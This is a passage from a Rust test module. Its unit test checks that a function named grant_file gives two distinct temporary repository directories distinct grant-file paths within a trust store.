    fn grant_files_differ_by_repo_path() {
        let a = tempfile::tempdir().unwrap();
        let b = tempfile::tempdir().unwrap();
        let store = std::path::Path::new("/tmp/cosmon-trust-store");
        assert_ne!(
            grant_file(store, a.path()),
            grant_file(store, b.path()),
            "distinct repositories get distinct grant files"
        );
    }
}
